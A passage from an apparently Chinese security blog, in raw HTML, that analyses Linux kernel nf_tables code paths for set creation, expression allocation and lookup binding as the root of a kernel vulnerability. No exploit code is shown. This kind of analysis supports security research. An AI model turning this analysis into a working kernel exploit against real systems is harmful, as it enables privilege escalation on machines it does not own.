-EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dtype != NFT_DATA_VERDICT) &#123;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DATA_LEN] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">desc.dlen = ntohl(nla_get_be32(nla[NFTA_SET_DATA_LEN]));</span><br><span class="line"><span class="keyword">if</span> (desc.dlen == <span class="number">0</span> || desc.dlen &gt; NFT_DATA_VALUE_MAXLEN)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">desc.dlen = <span class="keyword">sizeof</span>(struct nft_verdict);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_OBJ_TYPE] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_OBJECT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">objtype = ntohl(nla_get_be32(nla[NFTA_SET_OBJ_TYPE]));</span><br><span class="line"><span class="keyword">if</span> (objtype == NFT_OBJECT_UNSPEC || objtype &gt; NFT_OBJECT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; NFT_SET_OBJECT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">objtype = NFT_OBJECT_UNSPEC;</span><br><span class="line"></span><br><span class="line">timeout = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_TIMEOUT] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nf_msecs_to_jiffies64(nla[NFTA_SET_TIMEOUT], &amp;timeout);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">gc_int = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_GC_INTERVAL] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_TIMEOUT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">gc_int = ntohl(nla_get_be32(nla[NFTA_SET_GC_INTERVAL]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">policy = NFT_SET_POL_PERFORMANCE;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_POLICY] != <span class="literal">NULL</span>)</span><br><span class="line">policy = ntohl(nla_get_be32(nla[NFTA_SET_POLICY]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_DESC] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = nf_tables_set_desc_parse(&amp;desc, nla[NFTA_SET_DESC]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR] || nla[NFTA_SET_EXPRESSIONS])</span><br><span class="line">desc.expr = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_SET_TABLE], family, genmask,</span><br><span class="line"> NETLINK_CB(skb).portid);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup(table, nla[NFTA_SET_NAME], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(<span class="built_in">set</span>) != -ENOENT) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_SET_NAME]);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(info-&gt;nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE))</span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line"></span><br><span class="line">ops = nft_select_set_ops(&amp;ctx, nla, &amp;desc, policy);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line">udlen = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_USERDATA])</span><br><span class="line">udlen = nla_len(nla[NFTA_SET_USERDATA]);</span><br><span class="line"></span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;privsize != <span class="literal">NULL</span>)</span><br><span class="line">size = ops-&gt;privsize(nla, &amp;desc);</span><br><span class="line">alloc_size = <span class="keyword">sizeof</span>(*<span class="built_in">set</span>) + size + udlen;</span><br><span class="line"><span class="keyword">if</span> (alloc_size &lt; size || alloc_size &gt; INT_MAX)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"><span class="built_in">set</span> = kvzalloc(alloc_size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">set</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">name = nla_strdup(nla[NFTA_SET_NAME], GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!name) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_set_name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nf_tables_set_alloc_name(&amp;ctx, <span class="built_in">set</span>, name);</span><br><span class="line">kfree(name);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_name;</span><br><span class="line"></span><br><span class="line">udata = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (udlen) &#123;</span><br><span class="line">udata = <span class="built_in">set</span>-&gt;data + size;</span><br><span class="line">nla_memcpy(udata, nla[NFTA_SET_USERDATA], udlen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;<span class="built_in">set</span>-&gt;bindings);</span><br><span class="line">INIT_LIST_HEAD(&amp;<span class="built_in">set</span>-&gt;catchall_list);</span><br><span class="line"><span class="built_in">set</span>-&gt;table = table;</span><br><span class="line">write_pnet(&amp;<span class="built_in">set</span>-&gt;net, net);</span><br><span class="line"><span class="built_in">set</span>-&gt;ops = ops;</span><br><span class="line"><span class="built_in">set</span>-&gt;ktype = ktype;</span><br><span class="line"><span class="built_in">set</span>-&gt;klen = desc.klen;</span><br><span class="line"><span class="built_in">set</span>-&gt;dtype = dtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;objtype = objtype;</span><br><span class="line"><span class="built_in">set</span>-&gt;dlen = desc.dlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;flags = flags;</span><br><span class="line"><span class="built_in">set</span>-&gt;size = desc.size;</span><br><span class="line"><span class="built_in">set</span>-&gt;policy = policy;</span><br><span class="line"><span class="built_in">set</span>-&gt;udlen = udlen;</span><br><span class="line"><span class="built_in">set</span>-&gt;udata = udata;</span><br><span class="line"><span class="built_in">set</span>-&gt;timeout = timeout;</span><br><span class="line"><span class="built_in">set</span>-&gt;gc_int = gc_int;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;field_count = desc.field_count;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; desc.field_count; i++)</span><br><span class="line"><span class="built_in">set</span>-&gt;field_len[i] = desc.field_len[i];</span><br><span class="line"></span><br><span class="line">err = ops-&gt;init(<span class="built_in">set</span>, &amp;desc, nla);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_init;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_SET_EXPR]) &#123;</span><br><span class="line">expr = nft_set_elem_expr_alloc(&amp;ctx, <span class="built_in">set</span>, nla[NFTA_SET_EXPR]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr)) &#123;</span><br><span class="line">err = PTR_ERR(expr);</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span>-&gt;exprs[<span class="number">0</span>] = expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;num_exprs++;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_SET_EXPRESSIONS]) &#123;</span><br><span class="line">struct nft_expr *expr;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">int</span> left;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_SET_EXPR)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">nla_for_each_nested (tmp, nla[NFTA_SET_EXPRESSIONS], left) &#123;</span><br><span class="line"><span class="keyword">if</span> (i == NFT_SET_EXPR_MAX) &#123;</span><br><span class="line">err = -E2BIG;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line">expr = nft_set_elem_expr_alloc(&amp;ctx, <span class="built_in">set</span>, tmp);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr)) &#123;</span><br><span class="line">err = PTR_ERR(expr);</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">set</span>-&gt;exprs[i++] = expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;num_exprs++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span>-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line">err = nft_trans_set_add(&amp;ctx, NFT_MSG_NEWSET, <span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_set_expr_alloc;</span><br><span class="line"></span><br><span class="line">list_add_tail_rcu(&amp;<span class="built_in">set</span>-&gt;<span class="built_in">list</span>, &amp;table-&gt;sets);</span><br><span class="line">table-&gt;use++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_set_expr_alloc:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">set</span>-&gt;num_exprs; i++)</span><br><span class="line">nft_expr_destroy(&amp;ctx, <span class="built_in">set</span>-&gt;exprs[i]);</span><br><span class="line"></span><br><span class="line">ops-&gt;destroy(<span class="built_in">set</span>);</span><br><span class="line">err_set_init:</span><br><span class="line">kfree(<span class="built_in">set</span>-&gt;name);</span><br><span class="line">err_set_name:</span><br><span class="line">kvfree(<span class="built_in">set</span>);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上半部分处理<code>set</code>的跟漏洞关系不大，主要关注下面生成<code>expression</code>的过程，这里使用了<code>nft_set_elem_expr_alloc</code>函数进行申请。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct nft_expr *<span class="title">nft_set_elem_expr_alloc</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;e</span><br><span class="line"></span><br><span class="line">expr = nft_expr_init(ctx, attr);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(expr))</span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line"></span><br><span class="line">err = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (!(expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;type-&gt;flags &amp; NFT_EXPR_GC) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_TIMEOUT)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">set</span>-&gt;ops-&gt;gc_init)</span><br><span class="line"><span class="keyword">goto</span> err_set_elem_expr;</span><br><span class="line"><span class="built_in">set</span>-&gt;ops-&gt;gc_init(<span class="built_in">set</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line"></span><br><span class="line">err_set_elem_expr:</span><br><span class="line">nft_expr_destroy(ctx, expr);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在函数开头就调用了<code>nft_expr_init</code>进行初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct nft_expr *<span class="title">nft_expr_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> <span class="title">expr_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nf_tables_expr_parse(ctx, nla, &amp;expr_info);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_parse;</span><br><span class="line"></span><br><span class="line">err = -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (!(expr_info.ops-&gt;type-&gt;flags &amp; NFT_EXPR_STATEFUL))</span><br><span class="line"><span class="keyword">goto</span> err_expr_stateful;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">expr = kzalloc(expr_info.ops-&gt;size, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (expr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_stateful;</span><br><span class="line"></span><br><span class="line">err = nf_tables_newexpr(ctx, &amp;expr_info, expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_expr_new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> expr;</span><br><span class="line">err_expr_new:</span><br><span class="line">kfree(expr);</span><br><span class="line">err_expr_stateful:</span><br><span class="line">owner = expr_info.ops-&gt;type-&gt;owner;</span><br><span class="line"><span class="keyword">if</span> (expr_info.ops-&gt;type-&gt;release_ops)</span><br><span class="line">expr_info.ops-&gt;type-&gt;release_ops(expr_info.ops);</span><br><span class="line"></span><br><span class="line">module_put(owner);</span><br><span class="line">err_expr_parse:</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里就出现了我们比较熟悉的两个函数了<code>nf_tables_expr_parse</code>，<code>nf_tables_newexpr</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_ops</span>*<span class="title">ops</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>data[]</span><br><span class="line">__attribute__((aligned(__alignof__(u64))));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">nft_expr_priv</span><span class="params">(<span class="keyword">const</span> struct nft_expr *expr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)expr-&gt;data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_lookup_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nft_expr *expr,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> tb[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line">u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line">u32 flags;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_SET] == <span class="literal">NULL</span> ||</span><br><span class="line">    tb[NFTA_LOOKUP_SREG] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup_global(ctx-&gt;net, ctx-&gt;table, tb[NFTA_LOOKUP_SET],</span><br><span class="line">    tb[NFTA_LOOKUP_SET_ID], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_load(tb[NFTA_LOOKUP_SREG], &amp;priv-&gt;sreg,</span><br><span class="line">      <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_FLAGS]) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(tb[NFTA_LOOKUP_FLAGS]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_LOOKUP_F_INV)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; NFT_LOOKUP_F_INV) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">priv-&gt;invert = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_DREG] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (priv-&gt;invert)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_store(ctx, tb[NFTA_LOOKUP_DREG],</span><br><span class="line">       &amp;priv-&gt;dreg, <span class="literal">NULL</span>, <span class="built_in">set</span>-&gt;dtype,</span><br><span class="line">       <span class="built_in">set</span>-&gt;dlen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">priv-&gt;binding.flags = <span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP;</span><br><span class="line"></span><br><span class="line">err = nf_tables_bind_set(ctx, <span class="built_in">set</span>, &amp;priv-&gt;binding);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">priv-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照上面的分析此时就该调用<code>nft_lookup_init</code>函数了，这里主要需要注意的是最后一步操作，就是将<code>priv</code>绑定到<code>set</code>上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> __list_add_rcu(struct list_head *<span class="keyword">new</span>,</span><br><span class="line">struct list_head *prev, struct list_head *next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!__list_add_valid(<span class="keyword">new</span>, prev, next))</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span>-&gt;next = next;</span><br><span class="line"><span class="keyword">new</span>-&gt;prev = prev;</span><br><span class="line">rcu_assign_pointer(list_next_rcu(prev), <span class="keyword">new</span>);</span><br><span class="line">next-&gt;prev = <span class="keyword">new</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">list_add_tail_rcu</span><span class="params">(struct list_head *<span class="keyword">new</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">struct list_head *head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__list_add_rcu(<span class="keyword">new</span>, head-&gt;prev, head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">list</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span>*<span class="title">chain</span>;</span></span><br><span class="line">u32flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> &#123;</span></span><br><span class="line"><span class="class"><span 